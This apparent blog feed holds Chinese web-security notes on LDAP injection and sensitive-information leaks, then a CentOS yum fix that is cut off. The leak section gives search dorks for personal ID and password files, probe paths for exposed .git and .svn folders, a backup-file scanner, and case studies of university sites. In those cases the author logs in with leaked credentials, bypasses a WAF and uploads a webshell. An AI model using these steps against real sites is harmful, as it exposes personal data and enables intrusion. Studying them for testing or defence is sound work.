<code>**&quot;**</code> , <code>**'**</code> ）</p><h2 id="7-LDAP注入"><a class="header-anchor" href="#7-LDAP注入">¶</a>7.LDAP注入</h2><p>具体内容：<a href="https://blog.csdn.net/quiet_girl/article/details/50716312?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522FE59F2C6-A0EC-4059-A868-F6F5315293E9%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=FE59F2C6-A0EC-4059-A868-F6F5315293E9&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-5-50716312-null-null.142">LDAP注入与防御剖析</a><sup>v100</sup>pc_search_result_base9&amp;utm_term=LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB&amp;spm=1018.2226.3001.4187</p><p>LDAP注入攻击是一种利用基于用户输入构建LDAP语句的Web应用程序的攻击。当应用程序未能正确清理用户输入时，可以通过类似于SQL注入的技术来修改LDAP语句，从而执行未经授权的操作。</p><p>LDAP（轻量级目录访问协议）是一种用于访问和维护分布式目录信息服务的协议。Web应用程序通常使用LDAP来管理用户和权限。当应用程序通过用户输入来构建LDAP查询时，如果没有进行充分的输入验证，攻击者可以通过特制的输入修改LDAP查询，达到未授权访问或篡改数据的目的。</p><p>参考链接<br><a href="https://archive.codeplex.com/?p=linqtoad">LINQ to Active Directory</a>：提供在构建LDAP查询时自动进行LDAP编码的功能。<br><a href="https://spring.io/projects/spring-framework">Spring Framework Documentation</a>：了解如何使用Spring框架中的功能防止LDAP注入。<br><a href="https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html">OWASP LDAP Injection Prevention Cheat Sheet</a>：详细介绍LDAP注入的预防方法。<br><a href="https://docs.microsoft.com/en-us/dotnet/standard/security/encoding-and-escaping-data#ldap-encoding">Microsoft .NET Documentation</a>：了解如何在.NET中使用Encoder类进行LDAP编码。</p><hr><h2 id="1-漏洞原理"><a class="header-anchor" href="#1-漏洞原理">¶</a>1 漏洞原理</h2><p>敏感信息泄露漏洞，其挖掘难度和技术含量不高，但是危害性往往比较大。</p><p>以下是OWASP Top 10对敏感信息泄露的说明:</p><p><em>A6 敏感信息泄露 Sensitive Data Exposure</em></p><p>保护与加密敏感数据已经成为网络应用的最重要的组成部分。最常见的漏洞是应该进行加密的数据没有进行加密。使用加密的情况下常见问题是不安全的密钥和使用弱算法加密防范：</p><p>1.加密存储和传输所有的敏感数据</p><p>2.确保使用合适强大的标准算法和密钥，并且密钥管理到位</p><p>3.确保使用密码专用算法存储密码</p><p>4.及时清除没有必要存放的重要的/敏感数据</p><p>5.禁用自动收集敏感数据,禁用包含敏感数据的页面缓存</p><p>加密方法：采用非对称加密算法管理对称加密算法密钥，用对称加盟算法加密数据</p><p>基于个人认知，这里暂时将自己接触到的敏感信息泄露分为两类:<strong>人员敏感信息泄露</strong>(身份证，手机号，用户名，密码等等)，<strong>网站敏感信息泄露</strong>(网站源码，数据库备份，日志等等)</p><h3 id="1-1-人员敏感信息泄露"><a class="header-anchor" href="#1-1-人员敏感信息泄露">¶</a>1.1 人员敏感信息泄露</h3><p>人员敏感信息泄露主要由于网站未对上传目录或者下载目录进行限制，导致谷歌(居多)或百度爬虫爬取到储存有人员敏感信息的文档(xls,pdf,docx等)。对于这类敏感信息的挖掘很简单，只需要借助谷歌语法或百度语法即可。</p><p><strong>谷歌语法:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">site:example.edu.cnfiletype:xls|doc|docx|ppt|pptx|pdf 身份证|password|密码|手机号<br></code></pre></td></tr></table></figure><p><strong>百度语法:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">filetype:xls site:(*.tongji.edu.cn) (身份证 | 手机号 | 学号 | 密码)<br></code></pre></td></tr></table></figure><p><strong>修复方案:</strong></p><p>对该目录访问进行限制或删除文件</p><h3 id="1-2-网站敏感信息泄露"><a class="header-anchor" href="#1-2-网站敏感信息泄露">¶</a>1.2 网站敏感信息泄露</h3><p>相对于人员敏感信息泄露，网站敏感信息泄露兴许直接危害要更大一些。如果不确定有哪些算敏感信息，可以去Github看一下lijiejie的BBScan的字典。另外，这是一款很优秀的敏感信息扫描工具, github地址: <a href="https://github.com/lijiejie/BBScan">BBScan</a></p><p>这里简单介绍几种网站敏感信息:</p><p><strong>1）备份文件泄露</strong></p><p>前缀往往是域名或者常见文件名，后缀一般为.rar,.zip,.7z,.tar等。直接泄露源码，可通过简单审计找到网站后台，找到管理员密码或者数据库密码。有精力还可进行白盒审计，发现黑盒测试难以发现的漏洞。</p><p>备份文件有时也会出现一些问题:</p><p>1.压缩包有密码：爆破（从来没爆破出来过-_-）</p><p>(小技巧:在压缩包无法解密的情况下，双击压缩包，全屏显示，浏览目录查看是否有敏感信息(比如后台地址，备份数据库文件等等)</p><p>2.密码MD5解不开、数据库不外连: 尝试一下后台密码是否是数据库连接密码</p><p>mdb数据库查看工具(Excel也可): <a href="https://dl.pconline.com.cn/download/383881.html">链接</a></p><p>db,sqlite数据库查看工具: <a href="https://www.softpedia.com/get/Internet/Servers/Database-Utils/SQLiteSpy.shtml">链接</a></p><p>mdf文件查看工具: <a href="https://www.onlinedown.net/soft/634380.htm#down">链接</a></p><p><strong>2）.git源码泄露</strong></p><p>原理: 开发人员在开发时，常常会先把源码提交到远程托管网站（如github），最后再从远程托管网站把源码pull到服务器的web目录下，如果忘记把.git文件删除，就造成此漏洞。利用.git文件恢复处网站的源码，而源码里可能会有数据库的信息。</p><p>探测路径: /.git 或 /.git/config</p><p>输入.git能目录遍历，一般能dump所有源码，.git 403而.git/config能访问，这时候也能dump部分源码</p><p>Githack工具: <a href="https://github.com/lijiejie/GitHack">Githack</a></p><p><strong>3）.svn源码泄露</strong></p><p>原理:  Subversion是源代码版本管理软件，造成SVN源代码漏洞的主要原因是管理员操作不规范。在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用’导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境，黑客可以借助其中包含的用于版本信息追踪的<code>entries</code>文件，逐步摸清站点结构。利用<code>.svn/entries</code>文件，获取到服务器源码、svn服务器账号密码等信息。</p><p>探测路径:  /.svn/entries</p><p>svnExploit工具: <a href="https://github.com/admintony/svnExploit">svnExploit</a></p><p><strong>4）.idea敏感信息泄露</strong></p><p>原理: <em>Jet</em>  Brains产品的项目配置目录。一般用pycharm,idea等工具开发生成的项目配置目录。从中可泄露文件路径文件名等敏感信息</p><p>探测路径: /.idea/workspace.xml</p><p>idea_exploit工具: <a href="https://github.com/lijiejie/idea_exploit">idea_exploit</a></p><p><strong>5）.DS_Store敏感信息泄露</strong></p><p>原理: .DS_Store(英文全称 Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件们的图标位置或者是背景色的选择。相当于 Windows 下的 desktop.ini。一般泄露目录结构信息和文件信息。</p><p>探测路径: /.DS_Store</p><p>ds_store_exp工具: <a href="https://github.com/lijiejie/ds_store_exp">ds_store_exp</a></p><p><strong>6）java web配置信息泄露</strong></p><p>原理: Tomcat的WEB-INF目录，每个j2ee的web应用部署文件默认包含这个目录。Nginx在映射静态文件时，把WEB-INF目录映射进去，而又没有做Nginx的相关安全配置（或Nginx自身一些缺陷影响）。从而导致通过Nginx访问到Tomcat的WEB-INF目录,根据web.xml配置文件路径或通常开发时常用框架命名习惯，找到其他配置文件或类文件路径。dump class文件进行反编译。—— <a href="https://blog.csdn.net/qq_36869808/article/details/89086853">详情</a></p><p>探测路径: /WEB-INF/web.xml</p><p>java反编译工具: <a href="https://www.softpedia.com/get/Programming/Debuggers-Decompilers-Dissasemblers/Luyten.shtml">Luyten</a></p><p><strong>7）apache日志泄露</strong></p><p>探测路径: /server-status</p><p>可以实时查看apache日志信息，泄露请求信息</p><h2 id="2-漏洞感知"><a class="header-anchor" href="#2-漏洞感知">¶</a>2 漏洞感知</h2><p>开发环境: python 3</p><p>工具地址: <a href="https://github.com/lakemoon602/snail2.0">Snail2.0</a></p><p>其中针对.git、.svn、.idea、ds_store、apache状态日志扫描的轮子已经有了，就不再重复开发了，着重需要开发的是备份文件扫描功能。网站备份文件规律一般来说存在两种可能: 一是固定类型(www.rar,db.zip)等等，另外一种比较典型的就是与域名相关(xxx.edu.cn.zip)。对于固定类型搜集网上典型字典进行扫描。域名相关直接脚本生成即可。以下简要介绍相关函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#根据域名，生成敏感字典</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">genWeak</span>(<span class="hljs-params">name</span>):<br>    exts=[<span class="hljs-string">&#x27;.rar&#x27;</span>,<span class="hljs-string">&#x27;.zip&#x27;</span>,<span class="hljs-string">&#x27;.7z&#x27;</span>,<span class="hljs-string">&#x27;.tar&#x27;</span>,<span class="hljs-string">&#x27;.tar.7z&#x27;</span>,<span class="hljs-string">&#x27;.tar.gz&#x27;</span>,<span class="hljs-string">&#x27;.tar.bz2&#x27;</span>,<span class="hljs-string">&#x27;.tgz&#x27;</span>]<br>    res=[]<br>    <br>    element=name.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>    <span class="hljs-comment">#print(element)</span><br>    <span class="hljs-keyword">for</span> ext <span class="hljs-keyword">in</span> exts:<br>        domain=<span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> ele <span class="hljs-keyword">in</span> element:<br>            res.append(ele+ext)<br>            domain+=<span class="hljs-string">&#x27;.&#x27;</span>+ele<br>            res.append(domain+ext)<br>    data=[]<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> res:<br>        data.append(s.strip(<span class="hljs-string">&#x27;.&#x27;</span>))<br>    data=<span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(data))<br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-comment"># 返回包条件设置: 返回码+Content-Length字段</span><br><span class="hljs-keyword">if</span> req.status_code==<span class="hljs-number">200</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(req.headers[<span class="hljs-string">&quot;Content-Length&quot;</span>])&gt;=<span class="hljs-number">1000000</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]存在源码泄露\t&quot;</span>+vulnurl)<br>    <span class="hljs-keyword">return</span> [domain,tag,payload]<br></code></pre></td></tr></table></figure><p>除了扫描功能，还在该工具中添加了域名搜集功能，分别是百度的一个域名查询接口和网页链接爬取，聊胜于无。同时为了避免扫描太快网站禁用IP，可以设置延时扫描。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#百度云观测接口</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">baiduyun</span>(<span class="hljs-params">domain</span>):<br>    <span class="hljs-keyword">try</span>:<br>        res=requests.get(<span class="hljs-string">&quot;http://ce.baidu.com/index/getRelatedSites?site_address=&quot;</span>+domain)<br>        data=json.loads(res.text)<br>        domain=[]<br>        <span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> data[<span class="hljs-string">&quot;data&quot;</span>]:<br>            domain.append(value[<span class="hljs-string">&quot;domain&quot;</span>])<br>        <span class="hljs-keyword">return</span> domain<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> [domain]<br><br><span class="hljs-comment">#爬取域名，加入队列</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">spider</span>(<span class="hljs-params">url,time_out</span>):<br>    <span class="hljs-keyword">try</span>:<br>        headers = &#123;<br>            <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50&quot;</span><br>        &#125;<br>        rex=url.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>        <span class="hljs-keyword">if</span> rex[-<span class="hljs-number">1</span>]==<span class="hljs-string">&quot;com&quot;</span>:<br>            s=rex[-<span class="hljs-number">2</span>]+<span class="hljs-string">&quot;.&quot;</span>+rex[-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">elif</span> rex[-<span class="hljs-number">1</span>]==<span class="hljs-string">&quot;cn&quot;</span>:<br>            <span class="hljs-keyword">if</span> rex[-<span class="hljs-number">2</span>] <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;gov&quot;</span>,<span class="hljs-string">&quot;edu&quot;</span>]:<br>                s=rex[-<span class="hljs-number">3</span>]+<span class="hljs-string">&quot;.&quot;</span>+rex[-<span class="hljs-number">2</span>]+<span class="hljs-string">&quot;.&quot;</span>+rex[-<span class="hljs-number">1</span>]<br>        patt=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;http[s]?:.&#123;1,40&#125;.&quot;</span>+s)<br>        res=requests.get(url,headers=headers,timeout=<span class="hljs-number">3</span>)<br>        data=patt.findall(res.text)<br>        data=<span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(data))<br>        tmp=[]<br>        <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data:<br>            d=d.split(<span class="hljs-string">&quot;/&quot;</span>)[<span class="hljs-number">2</span>]<br>            <span class="hljs-keyword">if</span> d <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> domains:<br>                domains.append(d)<br>                tmp.append(d)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tmp)==<span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tmp)==<span class="hljs-number">1</span>:<br>            params=([tmp,time_out],<span class="hljs-literal">None</span>)<br>            request = makeRequests(scan, params)<br>            [pool.putRequest(req) <span class="hljs-keyword">for</span> req <span class="hljs-keyword">in</span> request]<br>            <span class="hljs-keyword">return</span>  <br>        params = [([d, time_out],<span class="hljs-literal">None</span>) <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> tmp]<br>        request = makeRequests(scan, params)<br>        [pool.putRequest(req) <span class="hljs-keyword">for</span> req <span class="hljs-keyword">in</span> request]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>使用界面:</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/479381/1600346613916-15667ca4-4702-411d-ac30-4e091b3004e0.png" alt="img"></p><h2 id="3-漏洞案例"><a class="header-anchor" href="#3-漏洞案例">¶</a>3 漏洞案例</h2><p>该漏洞案例蛮多的，这里只简单记录几个以证明其存在且具有危害。(以下漏洞均已通报修复)</p><h3 id="3-1-案例一"><a class="header-anchor" href="#3-1-案例一">¶</a>3.1 案例一</h3><p>扫描到某高校校长办公室网站源码。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/479381/1600347442167-0ed35754-451b-4fec-b743-60ae94f6964f.png" alt="img"></p><p>源码中泄露管理员账号密码 admin/123123, 登录后台</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/479381/1600347573126-d8ded2e4-4590-4fec-a87d-d16ef806ca05.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/479381/1600347585976-376c9835-52fd-4781-8a0f-7fc7cf42a93b.png" alt="img"></p><h3 id="3-2-案例二"><a class="header-anchor" href="#3-2-案例二">¶</a>3.2 案例二</h3><p>某高校网站源码泄露</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/479381/1600347793205-8fa65128-5c37-4c10-8a25-4f7b855e2621.png" alt="img"></p><p>通过源码获得后台地址、管理员账号密码，登录后台</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/479381/1600348067007-0bea2124-df82-4299-b1e8-00b0aa3a350d.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/479381/1600348074587-c95bf056-f47c-40ce-8475-0301f8394daf.png" alt="img"></p><p>同时，源码中还泄露了近5000人的身份证信息</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/479381/1600348127340-6695bdce-a994-41bc-8d01-23bc888e7046.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/479381/1600348135366-eb98ee5e-12ca-4006-9f0e-7f690a6bfcdd.png" alt="img"></p><h3 id="3-3-案例三"><a class="header-anchor" href="#3-3-案例三">¶</a>3.3 案例三</h3><p>同样某高校源码泄露</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/479381/1600348360528-7fbbd367-6405-4d62-b5f5-5ab114516981.png" alt="img"></p><p>泄露一处可外连的数据库</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/479381/1600348473725-894c64dc-0713-4c62-b23b-bca0916caf84.png" alt="img"></p><p>通过代码审计，发现一处任意文件读取及文件上传漏洞，可获得shell</p><p>该上传点并未进行任何过滤，但是存在玄武盾云waf，只要是php就干掉，上传了也无法访问</p><p>构造上传代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;html&gt;<br>&lt;body&gt;<br>&lt;form action=<span class="hljs-string">&quot;http://xxx.xxx.cn/webup/server/fileupload.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>    &lt;<span class="hljs-built_in">input</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span>&gt;<br>    &lt;button <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;提交&lt;/button&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>关于云waf的绕过，最好的方式莫过于找到该网站的真实IP，试用了很多DNS历史查询网站都没有找到，最后在<code>微步在线威胁情报社区</code>查找到历史解析IP。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/479381/1600349008011-ee7d5396-2428-4c2b-aff9-cea2f690bdef.png" alt="img"></p><p>修改host文件，绕过waf：<code>xx.xx.xx.xx xxx.xx.cn</code></p><p>成功上传webshell（真传shell还是有风险的，建议上传无害文件）</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/479381/1600349240548-c4465f9d-2cb9-4796-866a-50443e13d4eb.png" alt="img"></p><p><strong>PS: 有些时候，我们总执着于第一个挖到的漏洞类型，陷入故步自封。</strong></p><h2 id="VRRP"><a class="header-anchor" href="#VRRP">¶</a>VRRP</h2><h2 id="爬虫"><a class="header-anchor" href="#爬虫">¶</a>爬虫</h2><h3 id="百度爬虫"><a class="header-anchor" href="#百度爬虫">¶</a>百度爬虫</h3><p><a href="https://help.baidu.com/question?prod_id=99&amp;class=476&amp;id=2996">https://help.baidu.com/question?prod_id=99&amp;class=476&amp;id=2996</a></p><p><strong>如何区分PC与移动网页搜索的UA</strong></p><p>PC搜索完整UA：Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html）</p><p>移动搜索完整UA：Mozilla/5.0 (Linux;u;Android 4.2.2;zh-cn;) AppleWebKit/534.46 (KHTML,like Gecko) Version/5.1 Mobile Safari/10600.6.3 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</p><p>pc ua：通过关键词Baiduspider/2.0来确定是pc ua</p><p>移动ua：通过关键词android和mobile确定是来自移动端抓取访问，Baiduspider/2.0 确定为百度爬虫。</p><p><strong>6. 如何判断是否冒充Baiduspider的抓取？</strong></p><p>建议您使用DNS反向查找和DNS正向查找相结合的方式来确定抓取来源的ip是否属于百度，根据平台不同验证方法不同，如linux/windows/os三种平台下的验证方法分别如下：</p><p>6.1 在linux平台下：（1）使用host ip命令反解ip来判断是否来自Baiduspider的抓取。Baiduspider的hostname以 *.baidu.com 或 *.baidu.jp 的格式命名，非 *.baidu.com 或 *.baidu.jp 即为冒充。（2）使用host命令对第一步中的检索到的域名运行DNS正向查找，验证该域名与访问服务器的原始ip地址是否一致。</p><p>示例1：</p><p>$ host 123.125.66.120  120.66.125.123.in-addr.arpa domain name pointer <a href="http://baiduspider-123-125-66-120.crawl.baidu.com">baiduspider-123-125-66-120.crawl.baidu.com</a>.</p><p>$ host <a href="http://baiduspider-123-125-66-120.crawl.baidu.com">baiduspider-123-125-66-120.crawl.baidu.com</a></p><p><a href="http://baiduspider-123-125-66-120.crawl.baidu.com">baiduspider-123-125-66-120.crawl.baidu.com</a> has address 123.125.66.120</p><p>示例2：</p><p>$host 119.63.195.254</p><p>254.195.63.119.in-addr.arpa domain name pointer <a href="http://BaiduMobaider-119-63-195-254.crawl.baidu.jp">BaiduMobaider-119-63-195-254.crawl.baidu.jp</a>.</p><p>$host <a href="http://BaiduMobaider-119-63-195-254.crawl.baidu.jp">BaiduMobaider-119-63-195-254.crawl.baidu.jp</a></p><p><a href="http://BaiduMobaider-119-63-195-254.crawl.baidu.jp">BaiduMobaider-119-63-195-254.crawl.baidu.jp</a> has address 119.63.195.254</p><p>6.2 在windows平台或者IBM OS/2平台下：（1）使用nslookup ip命令反解ip来 判断是否来自Baiduspider的抓取。打开命令处理器 输入nslookup <a href="http://xxx.xxx.xxx.xxx">xxx.xxx.xxx.xxx</a>（IP地 址）就能解析ip， 来判断是否来自Baiduspider的抓取，Baiduspider的hostname以 *.baidu.com 或 *.baidu.jp 的格式命名，非 *.baidu.com 或 *.baidu.jp 即为冒充。（2）使用 nslookup命令对第一步中检索到的域名进行DNS正向查找，验证该域名与访问服务器的原始ip地址是否一致。</p><p>6.3 在mac os平台下：（1）使用dig 命令反解ip来判断是否来自Baiduspider的抓取。打开命令处理器 输入dig <a href="http://xxx.xxx.xxx.xxx">xxx.xxx.xxx.xxx</a>（IP地 址）就能解析ip，来判断是否来自Baiduspider的抓取，Baiduspider的hostname以 *.baidu.com 或 *.baidu.jp 的格式命名，非 *.baidu.com 或 *.baidu.jp 即为冒充；（2）使用 dig命令对第一步中检索到的域名进行DNS正向查找，验证该域名与访问服务器的原始ip地址是否一致。</p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
      <category>理论知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全</tag>
      
      <tag>理论知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用yum报错以及解决</title>
    <link href="/posts/fbbc350b.html"/>
    <url>/posts/fbbc350b.html</url>
    
    <content type="html"><![CDATA[<h1>使用yum报错以及解决</h1><h3 id="起因"><a class="header-anchor" href="#起因">¶</a>起因</h3><p>在安装雷池WAF的时候，利用文档中的一条命令安装语句进行安装时，无法安装docker环境，又尝试进行手动安装，依然报错。</p><p>报错如下：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs gauss">[root<span class="hljs-comment">@safeline-waf ~]# yum -y install yum-utils device-mapper-persistent-datalvm2</span><br><span class="hljs-comment">已加载插件：fastestmirror, langpacks</span><br><span class="hljs-comment">Loading mirror speeds from cached hostfile</span><br><span class="hljs-comment">Could not retrieve mirrorlist http://mirrorlist.centos.org/?release=7&amp;arch=x86_64&amp;repo=os&amp;infra=stock error was</span><br><span class="hljs-comment">14: curl#6 - &quot;Could not resolve host: mirrorlist.centos.org; 未知的错误&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> One of the configured repositories failed (未知),</span><br><span class="hljs-comment"> and yum doesn&#x27;t have enough cached data to continue. At this point the only</span><br><span class="hljs-comment"> safe thing yum can do is fail. There are a few ways to work &quot;fix&quot; this:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     1. Contact the upstream for the repository and get them to fix the problem.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     2. Reconfigure the baseurl/etc. for the repository, to point to a working</span><br><span class="hljs-comment">        upstream. This is most often useful if you are using a newer</span><br><span class="hljs-comment">        distribution release than is supported by the repository (and the</span><br><span class="hljs-comment">        packages for the previous distribution release still work).</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     3. Run the command with the repository temporarily disabled</span><br><span class="hljs-comment">            yum --disablerepo=&lt;repoid&gt; ...</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     4. Disable the repository permanently, so yum won&#x27;t use it by default. Yum</span><br><span class="hljs-comment">        will then just ignore the repository until you permanently enable it</span><br><span class="hljs-comment">        again or use --enablerepo for temporary usage:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">            yum-config-manager --disable &lt;repoid&gt;</span><br><span class="hljs-comment">        or</span><br><span class="hljs-comment">            subscription-manager repos --disable=&lt;repoid&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     5. Configure the failing repository to be skipped, if it is unavailable.</span><br><span class="hljs-comment">        Note that yum will try to contact the repo. when it runs most commands,</span><br><span class="hljs-comment">        so will have to try and fail each time (and thus. yum will be be much</span><br><span class="hljs-comment">        slower). If it is a very temporary problem though, this is often a nice</span><br><span class="hljs-comment">        compromise:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">            yum-config-manager --save --setopt=&lt;repoid&gt;.skip_if_unavailable=true</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Cannot find a valid baseurl for repo: base/7/x86_64</span><br></code></pre></td></tr></table></figure><p>无法解析 <code>mirrorlist.centos.org</code> 主机名，导致无法获取镜像列表，进而无法安装所需的软件包。</p><p>先排查网络问题：</p><p>尝试分析问题原因<br>出现这个错误是因为使用的 CentOS 7 仓库已经被归档，当前的镜像地址无法找到所需的文件。CentOS 7 的官方支持已经结束，部分仓库已被移至归档库。这导致了你的 yum 命令无法找到所需的元数据文件。CentOS 7 的官方仓库在 2024 年 6 月 30 日之后已经停止维护。因此，使用最新的 CentOS 7 官方仓库可能会遇到问题。</p><p>原文链接：<a href="https://blog.csdn.net/weixin_62746478/article/details/140794107">https://blog.csdn.net/weixin_62746478/article/details/140794107</a></p><p>进入/etc/yum.repos.d目录下找到 CentOS-Base.repo</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/etc/yum</span>.repos.d<br></code></pre></td></tr></table></figure><p>现复制一份做备份</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">cp  CentOS-<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base</span>.</span></span>repo   CentOS-<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base</span>.</span></span>repo.backup<br></code></pre></td></tr></table></figure><p>修改原文件内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 